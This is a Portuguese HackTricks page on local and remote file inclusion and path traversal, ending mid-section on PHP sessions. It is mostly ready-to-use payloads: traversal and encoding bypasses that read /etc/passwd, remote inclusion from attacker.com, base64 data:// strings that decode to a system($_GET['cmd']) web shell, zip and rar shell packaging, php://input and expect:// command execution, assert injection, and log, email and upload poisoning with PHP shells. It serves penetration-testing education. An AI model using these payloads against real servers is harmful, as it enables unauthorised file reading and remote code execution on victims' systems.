# Inclus√£o de Arquivos/Traversal de Caminho

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e nos desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre as novas recompensas de bugs lan√ßadas e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Inclus√£o de Arquivos

**Inclus√£o de Arquivos Remota (RFI):** O arquivo √© carregado de um servidor remoto (Melhor: Voc√™ pode escrever o c√≥digo e o servidor o executar√°). Em php isso est√° **desativado** por padr√£o (**allow\_url\_include**).\
**Inclus√£o de Arquivos Local (LFI):** O servidor carrega um arquivo local.

A vulnerabilidade ocorre quando o usu√°rio pode controlar de alguma forma o arquivo que ser√° carregado pelo servidor.

Fun√ß√µes **PHP vulner√°veis**: require, require\_once, include, include\_once

Uma ferramenta interessante para explorar essa vulnerabilidade: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessante - arquivos LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Misturando v√°rias listas de LFI \*nix e adicionando mais caminhos, criei esta:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Tente tamb√©m mudar `/` por `\`\
Tente tamb√©m adicionar `../../../../../`

Uma lista que usa v√°rias t√©cnicas para encontrar o arquivo /etc/password (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mescla de diferentes listas de palavras:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Tente tamb√©m mudar `/` por `\`\
Tente tamb√©m remover `C:/` e adicionar `../../../../../`

Uma lista que usa v√°rias t√©cnicas para encontrar o arquivo /boot.ini (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Verifique a lista de LFI do linux.

## LFI b√°sico e contornos

Todos os exemplos s√£o para Local File Inclusion, mas tamb√©m podem ser aplicados a Remote File Inclusion (p√°gina=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sequ√™ncias de travessia removidas n√£o recursivamente
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass o acr√©scimo de mais caracteres no final da string fornecida (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Isso est√° **resolvido desde o PHP 5.4**

### **Codifica√ß√£o**

Voc√™ pode usar codifica√ß√µes n√£o padr√£o, como double URL encode (e outras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### De pasta existente

Talvez o back-end esteja verificando o caminho da pasta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Explorando Diret√≥rios do Sistema de Arquivos em um Servidor

O sistema de arquivos de um servidor pode ser explorado recursivamente para identificar diret√≥rios, n√£o apenas arquivos, empregando certas t√©cnicas. Este processo envolve determinar a profundidade do diret√≥rio e sondar a exist√™ncia de pastas espec√≠ficas. Abaixo est√° um m√©todo detalhado para alcan√ßar isso:

1. **Determinar a Profundidade do Diret√≥rio:** Determine a profundidade do seu diret√≥rio atual buscando com sucesso o arquivo `/etc/passwd` (aplic√°vel se o servidor for baseado em Linux). Um exemplo de URL pode ser estruturado da seguinte forma, indicando uma profundidade de tr√™s:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Procurar por Pastas:** Anexe o nome da pasta suspeita (por exemplo, `private`) √† URL, e ent√£o navegue de volta para `/etc/passwd`. O n√≠vel de diret√≥rio adicional requer aumentar a profundidade em um:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretar os Resultados:** A resposta do servidor indica se a pasta existe:
* **Erro / Sem Sa√≠da:** A pasta `private` provavelmente n√£o existe na localiza√ß√£o especificada.
* **Conte√∫do de `/etc/passwd`:** A presen√ßa da pasta `private` √© confirmada.
4. **Explora√ß√£o Recursiva:** Pastas descobertas podem ser investigadas mais a fundo em busca de subdiret√≥rios ou arquivos usando a mesma t√©cnica ou m√©todos tradicionais de Local File Inclusion (LFI).

Para explorar diret√≥rios em diferentes locais no sistema de arquivos, ajuste o payload de acordo. Por exemplo, para verificar se `/var/www/` cont√©m um diret√≥rio `private` (supondo que o diret√≥rio atual esteja a uma profundidade de 3), use:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **T√©cnica de Truncamento de Caminho**

O truncamento de caminho √© um m√©todo empregado para manipular caminhos de arquivos em aplica√ß√µes web. √â frequentemente utilizado para acessar arquivos restritos, contornando certas medidas de seguran√ßa que adicionam caracteres adicionais ao final dos caminhos de arquivos. O objetivo √© criar um caminho de arquivo que, uma vez alterado pela medida de seguran√ßa, ainda aponte para o arquivo desejado.

Em PHP, v√°rias representa√ß√µes de um caminho de arquivo podem ser consideradas equivalentes devido √† natureza do sistema de arquivos. Por exemplo:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, e `/etc/passwd/` s√£o todos tratados como o mesmo caminho.
* Quando os √∫ltimos 6 caracteres s√£o `passwd`, adicionar um `/` (tornando-o `passwd/`) n√£o muda o arquivo alvo.
* Da mesma forma, se `.php` for adicionado a um caminho de arquivo (como `shellcode.php`), adicionar um `/.` no final n√£o alterar√° o arquivo sendo acessado.

Os exemplos fornecidos demonstram como utilizar o truncamento de caminho para acessar `/etc/passwd`, um alvo comum devido ao seu conte√∫do sens√≠vel (informa√ß√µes de conta de usu√°rio):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Nesses cen√°rios, o n√∫mero de travessias necess√°rias pode ser em torno de 2027, mas esse n√∫mero pode variar com base na configura√ß√£o do servidor.

* **Usando Segmentos de Ponto e Caracteres Adicionais**: Sequ√™ncias de travessia (`../`) combinadas com segmentos de ponto e caracteres extras podem ser usadas para navegar pelo sistema de arquivos, ignorando efetivamente as strings anexadas pelo servidor.
* **Determinando o N√∫mero Necess√°rio de Travessias**: Atrav√©s de tentativa e erro, pode-se encontrar o n√∫mero preciso de sequ√™ncias `../` necess√°rias para navegar at√© o diret√≥rio raiz e, em seguida, para `/etc/passwd`, garantindo que quaisquer strings anexadas (como `.php`) sejam neutralizadas, mas o caminho desejado (`/etc/passwd`) permane√ßa intacto.
* **Come√ßando com um Diret√≥rio Falso**: √â uma pr√°tica comum come√ßar o caminho com um diret√≥rio inexistente (como `a/`). Essa t√©cnica √© usada como uma medida de precau√ß√£o ou para atender aos requisitos da l√≥gica de an√°lise de caminho do servidor.

Ao empregar t√©cnicas de truncamento de caminho, √© crucial entender o comportamento de an√°lise de caminho do servidor e a estrutura do sistema de arquivos. Cada cen√°rio pode exigir uma abordagem diferente, e testes s√£o frequentemente necess√°rios para encontrar o m√©todo mais eficaz.

**Essa vulnerabilidade foi corrigida no PHP 5.3.**

### **Truques de bypass de filtro**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclus√£o Remota de Arquivo

Em php isso est√° desativado por padr√£o porque **`allow_url_include`** est√° **Desligado.** Deve estar **Ligado** para funcionar, e nesse caso voc√™ poderia incluir um arquivo PHP do seu servidor e obter RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se por algum motivo **`allow_url_include`** est√° **Ativado**, mas o PHP est√° **filtrando** o acesso a p√°ginas da web externas, [de acordo com este post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), voc√™ poderia usar, por exemplo, o protocolo de dados com base64 para decodificar um c√≥digo PHP em b64 e obter RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
No c√≥digo anterior, o final `+.txt` foi adicionado porque o atacante precisava de uma string que terminasse em `.txt`, ent√£o a string termina com isso e, ap√≥s a decodifica√ß√£o b64, essa parte retornar√° apenas lixo e o verdadeiro c√≥digo PHP ser√° inclu√≠do (e, portanto, executado).
{% endhint %}

Outro exemplo **n√£o usando o protocolo `php://`** seria:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento Raiz em Python

Em python, em um c√≥digo como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se o usu√°rio passar um **caminho absoluto** para **`file_name`**, o **caminho anterior √© apenas removido**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
√â o comportamento pretendido de acordo com [a documenta√ß√£o](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se um componente for um caminho absoluto, todos os componentes anteriores s√£o descartados e a jun√ß√£o continua a partir do componente de caminho absoluto.

## Java Listar Diret√≥rios

Parece que se voc√™ tiver uma Path Traversal em Java e **pedir um diret√≥rio** em vez de um arquivo, um **listagem do diret√≥rio √© retornada**. Isso n√£o acontecer√° em outras linguagens (at√© onde sei).

## 25 principais par√¢metros

Aqui est√° uma lista dos 25 principais par√¢metros que podem ser vulner√°veis a vulnerabilidades de inclus√£o de arquivos locais (LFI) (de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando wrappers e protocolos PHP

### php://filter

Os filtros PHP permitem realizar **opera√ß√µes b√°sicas de modifica√ß√£o nos dados** antes de serem lidos ou escritos. Existem 5 categorias de filtros:

* [Filtros de String](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Remove tags dos dados (tudo entre os caracteres "<" e ">")
* Note que este filtro desapareceu das vers√µes modernas do PHP
* [Filtros de Convers√£o](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforma para uma codifica√ß√£o diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obter a **lista de todas as codifica√ß√µes** suportadas, execute no console: `iconv -l`

{% hint style="warning" %}
Abusando do filtro de convers√£o `convert.iconv.*` voc√™ pode **gerar texto arbitr√°rio**, o que pode ser √∫til para escrever texto arbitr√°rio ou fazer uma fun√ß√£o como incluir texto arbitr√°rio. Para mais informa√ß√µes, consulte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de Compress√£o](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprime o conte√∫do (√∫til se exfiltrando muitas informa√ß√µes)
* `zlib.inflate`: Descomprime os dados
* [Filtros de Criptografia](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Obsoleto
* `mdecrypt.*` : Obsoleto
* Outros Filtros
* Executando em php `var_dump(stream_get_filters());` voc√™ pode encontrar alguns **filtros inesperados**:
* `consumed`
* `dechunk`: reverte a codifica√ß√£o HTTP em peda√ßos
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
A parte "php://filter" n√£o diferencia mai√∫sculas de min√∫sculas
{% endhint %}

### Usando filtros php como or√°culo para ler arquivos arbitr√°rios

[**Neste post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) √© proposta uma t√©cnica para ler um arquivo local sem que a sa√≠da seja retornada pelo servidor. Esta t√©cnica √© baseada em uma **exfiltra√ß√£o booleana do arquivo (caractere por caractere) usando filtros php** como or√°culo. Isso ocorre porque os filtros php podem ser usados para aumentar um texto o suficiente para que o php lance uma exce√ß√£o.

No post original, voc√™ pode encontrar uma explica√ß√£o detalhada da t√©cnica, mas aqui est√° um resumo r√°pido:

* Use o codec **`UCS-4LE`** para deixar o caractere inicial do texto no in√≠cio e fazer o tamanho da string aumentar exponencialmente.
* Isso ser√° usado para gerar um **texto t√£o grande quando a letra inicial for adivinhada corretamente** que o php acionar√° um **erro**.
* O filtro **dechunk** **remover√° tudo se o primeiro caractere n√£o for um hexadecimal**, ent√£o podemos saber se o primeiro caractere √© hexadecimal.
* Isso, combinado com o anterior (e outros filtros dependendo da letra adivinhada), nos permitir√° adivinhar uma letra no in√≠cio do texto ao ver quando fazemos transforma√ß√µes suficientes para que n√£o seja um caractere hexadecimal. Porque se for hexadecimal, o dechunk n√£o o deletar√° e a bomba inicial far√° o php gerar um erro.
* O codec **convert.iconv.UNICODE.CP930** transforma cada letra na seguinte (ent√£o ap√≥s este codec: a -> b). Isso nos permite descobrir se a primeira letra √© um `a`, por exemplo, porque se aplicarmos 6 desse codec a->b->c->d->e->f->g a letra n√£o √© mais um caractere hexadecimal, portanto o dechunk n√£o a deletou e o erro do php √© acionado porque se multiplica com a bomba inicial.
* Usando outras transforma√ß√µes como **rot13** no in√≠cio, √© poss√≠vel vazar outros caracteres como n, o, p, q, r (e outros codecs podem ser usados para mover outras letras para a faixa hexadecimal).
* Quando o caractere inicial √© um n√∫mero, √© necess√°rio codific√°-lo em base64 e vazar as 2 primeiras letras para vazar o n√∫mero.
* O problema final √© ver **como vazar mais do que a letra inicial**. Usando filtros de mem√≥ria de ordem como **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** √© poss√≠vel mudar a ordem dos caracteres e obter na primeira posi√ß√£o outras letras do texto.
* E para poder obter **mais dados** a ideia √© **gerar 2 bytes de dados lixo no in√≠cio** com **convert.iconv.UTF16.UTF16**, aplicar **UCS-4LE** para fazer com que **seja piv√¥ com os pr√≥ximos 2 bytes**, e **deletar os dados at√© os dados lixo** (isso remover√° os primeiros 2 bytes do texto inicial). Continue fazendo isso at√© alcan√ßar o bit desejado para vazar.

No post, uma ferramenta para realizar isso automaticamente tamb√©m foi vazada: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Este wrapper permite acessar descritores de arquivo que o processo tem abertos. Potencialmente √∫til para exfiltrar o conte√∫do de arquivos abertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Voc√™ tamb√©m pode usar **php://stdin, php://stdout e php://stderr** para acessar os **descritores de arquivo 0, 1 e 2** respectivamente (n√£o tenho certeza de como isso poderia ser √∫til em um ataque)

### zip:// e rar://

Carregue um arquivo Zip ou Rar com um PHPShell dentro e acesse-o.\
Para poder abusar do protocolo rar, ele **precisa ser ativado especificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Note que este protocolo √© restrito pelas configura√ß√µes do php **`allow_url_open`** e **`allow_url_include`**

### expect://

Expect deve ser ativado. Voc√™ pode executar c√≥digo usando isto:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique seu payload nos par√¢metros POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Um arquivo `.phar` pode ser utilizado para executar c√≥digo PHP quando uma aplica√ß√£o web utiliza fun√ß√µes como `include` para carregamento de arquivos. O trecho de c√≥digo PHP fornecido abaixo demonstra a cria√ß√£o de um arquivo `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Para compilar o arquivo `.phar`, o seguinte comando deve ser executado:
```bash
php --define phar.readonly=0 create_path.php
```
Ao ser executado, um arquivo chamado `test.phar` ser√° criado, o que pode ser potencialmente utilizado para explorar vulnerabilidades de Inclus√£o de Arquivo Local (LFI).

Em casos onde o LFI apenas realiza a leitura de arquivos sem executar o c√≥digo PHP contido, atrav√©s de fun√ß√µes como `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ou `filesize()`, pode-se tentar explorar uma vulnerabilidade de desserializa√ß√£o. Essa vulnerabilidade est√° associada √† leitura de arquivos usando o protocolo `phar`.

Para uma compreens√£o detalhada da explora√ß√£o de vulnerabilidades de desserializa√ß√£o no contexto de arquivos `.phar`, consulte o documento vinculado abaixo:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

Foi poss√≠vel abusar de **qualquer arquivo arbitr√°rio lido do PHP que suporta filtros php** para obter um RCE. A descri√ß√£o detalhada pode ser [**encontrada neste post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Um resumo muito r√°pido: um **overflow de 3 bytes** na heap do PHP foi abusado para **alterar a cadeia de blocos livres** de um tamanho espec√≠fico para poder **escrever qualquer coisa em qualquer endere√ßo**, ent√£o um hook foi adicionado para chamar **`system`**.\
Foi poss√≠vel alocar blocos de tamanhos espec√≠ficos abusando de mais filtros php.

### Mais protocolos

Verifique mais poss√≠veis [**protocolos para incluir aqui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Escrever na mem√≥ria ou em um arquivo tempor√°rio (n√£o tenho certeza de como isso pode ser √∫til em um ataque de inclus√£o de arquivo)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Acessando o sistema de arquivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Acessando URLs HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Acessando URLs FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Fluxos de Compress√£o
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Encontrar nomes de caminho que correspondem ao padr√£o (n√£o retorna nada imprim√≠vel, ent√£o n√£o √© realmente √∫til aqui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Fluxos de √°udio (n√£o √∫til para ler arquivos arbitr√°rios)

## LFI via 'assert' do PHP

Os riscos de Inclus√£o de Arquivo Local (LFI) no PHP s√£o notavelmente altos ao lidar com a fun√ß√£o 'assert', que pode executar c√≥digo dentro de strings. Isso √© particularmente problem√°tico se a entrada contendo caracteres de travessia de diret√≥rio como ".." estiver sendo verificada, mas n√£o devidamente sanitizada.

Por exemplo, o c√≥digo PHP pode ser projetado para prevenir a travessia de diret√≥rio assim:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Enquanto isso visa impedir a travessia, inadvertidamente cria um vetor para inje√ß√£o de c√≥digo. Para explorar isso para ler o conte√∫do de arquivos, um atacante poderia usar:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Da mesma forma, para executar comandos de sistema arbitr√°rios, pode-se usar:
```plaintext
' and die(system("id")) or '
```
√â importante **URL-encodar esses payloads**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e nos desafios do hacking

**Not√≠cias de Hack em Tempo Real**\
Mantenha-se atualizado com o mundo do hacking em ritmo acelerado atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## PHP Blind Path Traversal

{% hint style="warning" %}
Esta t√©cnica √© relevante em casos onde voc√™ **controla** o **caminho do arquivo** de uma **fun√ß√£o PHP** que ir√° **acessar um arquivo**, mas voc√™ n√£o ver√° o conte√∫do do arquivo (como uma chamada simples para **`file()`**) e o conte√∫do n√£o √© exibido.
{% endhint %}

Em [**este incr√≠vel post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) √© explicado como um blind path traversal pode ser abusado via filtro PHP para **exfiltrar o conte√∫do de um arquivo atrav√©s de um oracle de erro**.

Em resumo, a t√©cnica usa a **"codifica√ß√£o UCS-4LE"** para tornar o conte√∫do de um arquivo t√£o **grande** que a **fun√ß√£o PHP que abre** o arquivo ir√° disparar um **erro**.

Ent√£o, para vazar o primeiro caractere, o filtro **`dechunk`** √© usado junto com outros como **base64** ou **rot13** e, finalmente, os filtros **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** s√£o usados para **colocar outros caracteres no in√≠cio e vaz√°-los**.

**Fun√ß√µes que podem ser vulner√°veis**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (apenas alvo somente leitura com isso)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para os detalhes t√©cnicos, confira o post mencionado!

## LFI2RCE

### Remote File Inclusion

Explicado anteriormente, [**siga este link**](./#remote-file-inclusion).

### Via arquivo de log do Apache/Nginx

Se o servidor Apache ou Nginx for **vulner√°vel a LFI** dentro da fun√ß√£o de inclus√£o, voc√™ pode tentar acessar **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, definindo dentro do **user agent** ou dentro de um **par√¢metro GET** um shell PHP como **`<?php system($_GET['c']); ?>`** e incluir esse arquivo

{% hint style="warning" %}
Observe que **se voc√™ usar aspas duplas** para o shell em vez de **aspas simples**, as aspas duplas ser√£o modificadas para a string "_**quote;**_", **PHP lan√ßar√° um erro** l√° e **nada mais ser√° executado**.

Al√©m disso, certifique-se de **escrever corretamente o payload** ou o PHP ir√° gerar um erro toda vez que tentar carregar o arquivo de log e voc√™ n√£o ter√° uma segunda oportunidade.
{% endhint %}

Isso tamb√©m pode ser feito em outros logs, mas **tenha cuidado**, o c√≥digo dentro dos logs pode estar URL codificado e isso pode destruir o Shell. O cabe√ßalho **authorisation "basic"** cont√©m "user:password" em Base64 e √© decodificado dentro dos logs. O PHPShell pode ser inserido dentro desse cabe√ßalho.\
Outros poss√≠veis caminhos de log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envie um e-mail** para uma conta interna (user@localhost) contendo seu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e tente incluir no e-mail do usu√°rio com um caminho como **`/var/mail/<USERNAME>`** ou **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Fa√ßa upload de muitas shells (por exemplo: 100)
2. Inclua [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), com $PID = PID do processo (pode ser for√ßado por brute force) e $FD o descritor de arquivo (tamb√©m pode ser for√ßado por brute force)

### Via /proc/self/environ

Como um arquivo de log, envie o payload no User-Agent, ele ser√° refletido dentro do arquivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se voc√™ puder fazer upload de um arquivo, basta injetar a carga √∫til do shell nele (por exemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para manter o arquivo leg√≠vel, √© melhor injetar nos metadados das imagens/doc/pdf

### Via upload de arquivo Zip

Fa√ßa o upload de um arquivo ZIP contendo um shell PHP comprimido e acesse:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Verifique se o site usa PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Em PHP, essas sess√µes s√£o armazenadas em arquivos _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
